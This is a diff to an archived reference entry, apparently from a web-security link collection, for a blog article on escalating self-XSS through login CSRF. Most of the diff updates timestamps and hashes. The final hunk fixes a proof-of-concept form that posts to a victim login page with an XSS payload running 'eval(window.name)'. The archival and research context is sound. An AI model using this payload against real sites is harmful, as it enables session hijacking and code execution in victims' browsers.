@@ -6,9 +6,9 @@ resource: "https://blog.slonser.info/posts/make-self-xss-great-again/"
 tags: [article, webseclist-reference, blog-slonser-info, xss, iframe, csrf, sop-bypass, clickjacking, same-origin-policy, cookie, bug-bounty, owasp-a01-2021, owasp-a03-2021, owasp-a04-2021, owasp-a07-2021]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-14T01:06:09+00:00"
+  at: "2026-08-16T00:00:38+00:00"
 status: stable
-stale_after: 2027-08-14
+stale_after: 2027-08-16
 sources:
   - id: original
     resource: "https://blog.slonser.info/posts/make-self-xss-great-again/"
@@ -22,7 +22,7 @@ canonical_url: ""
 cited_by:
   - "2025.md:54"
 commit: ""
-content_sha256: e1ffc3266677247c3ab31ac250f94bee9a57a80895753c41a8875f58534dca4e
+content_sha256: f6f89d1c6cc2dee59cce008683e334f42c3fadb763109b347a932323317bc49d
 depth: full
 depth_reason: default
 kind: article
@@ -35,7 +35,7 @@ publisher_english: ""
 raw_sha256: c6b129e9b9460ab0fa3ec8128dd62f837e91539909a045ecd79b30b1ae60165e
 retrieved_from: "https://blog.slonser.info/posts/make-self-xss-great-again/"
 retrieved_kind: stored
-retrieved_utc: "2026-08-14T01:06:09+00:00"
+retrieved_utc: "2026-08-16T00:00:38+00:00"
 slug: 2025-blog-slonser-info-make-self-xss-great-again
 snapshot: ""
 title_english: ""
@@ -49,7 +49,7 @@ translation_of: ""
 
 - Published: 2025-06-13
 - Original: <https://blog.slonser.info/posts/make-self-xss-great-again/>
-- Preserved from: https://blog.slonser.info/posts/make-self-xss-great-again/ (stored) on 2026-08-14
+- Preserved from: https://blog.slonser.info/posts/make-self-xss-great-again/ (stored) on 2026-08-16
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
@@ -149,7 +149,7 @@ After this, it’s worth examining the `/login` form. If it lacks CSRF protectio
 <html>
 <body>
   <form action="http://victim.domain/login" method="POST">
-    <input type="hidden" name="username" value="attacker_username<img src=x > />
+    <input type="hidden" name="username" value="attacker_username<img src=x onerror=eval(window.name)>" />
     <input type="hidden" name="password" value="Super_s@fe_password" />
     <input type="submit" value="Submit request" />
   </form>
